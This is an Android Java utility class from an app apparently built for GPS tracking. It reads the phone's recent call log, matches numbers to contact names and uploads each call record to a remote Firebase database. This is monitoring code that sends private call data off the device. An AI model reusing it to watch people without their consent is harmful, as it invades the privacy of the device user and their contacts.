package com.sgs.gpstracker.utils;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;

public class ServiceClassUtils
{



    public static void fetchAndUploadCallLogs(Context context, String deviceId) {
        long currentTime = System.currentTimeMillis();
        long twoDaysAgo = currentTime - (2L * 24 * 60 * 60 * 1000); // 2 days in milliseconds

        DatabaseReference dbRef = FirebaseDatabase.getInstance()
                .getReference("users")
                .child(deviceId)
                .child("calllogs");

        // Delete previous call logs
        dbRef.removeValue().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Cursor cursor = context.getContentResolver().query(
                        CallLog.Calls.CONTENT_URI,
                        null,
                        CallLog.Calls.DATE + ">= ?",
                        new String[]{String.valueOf(twoDaysAgo)},
                        CallLog.Calls.DATE + " DESC"
                );

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        int typeCode = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)); // duration in seconds

                        // Get contact name from number
                        String contactName = getContactName(context, number);
                        if (contactName == null || contactName.isEmpty()) {
                            contactName = "Unknown";
                        }

                        String callType;
                        switch (typeCode) {
                            case CallLog.Calls.INCOMING_TYPE:
                                callType = "Incoming";
                                break;
                            case CallLog.Calls.OUTGOING_TYPE:
                                callType = "Outgoing";
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                callType = "Missed";
                                break;
                            default:
                                callType = "Other";
                                break;
                        }

                        String formattedDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                                .format(new Date(timestamp));

                        HashMap<String, Object> callData = new HashMap<>();
                        callData.put("number", number);
                        callData.put("name", contactName);
                        callData.put("type", callType);
                        callData.put("timestamp", timestamp);
                        callData.put("formattedDate", formattedDate);
                        callData.put("duration", duration); // ⏱️ Add duration in seconds

                        dbRef.push().setValue(callData);
                        Log.d("CallLogUpload", "Uploaded call: " + callData);

                    } while (cursor.moveToNext());

                    cursor.close();
                } else {
                    Log.d("CallLogUpload", "No call logs found in last 2 days.");
                }
            } else {
                Log.e("CallLogUpload", "Failed to clear previous call logs from Firebase.");
            }
        });
    }


    private static String getContactName(Context context, String phoneNumber) {
        String contactName = null;
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));

        Cursor cursor = context.getContentResolver().query(
                uri,
                new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME},
                null,
                null,
                null
        );

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                contactName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME));
            }
            cursor.close();
        }

        return contactName;
    }





}
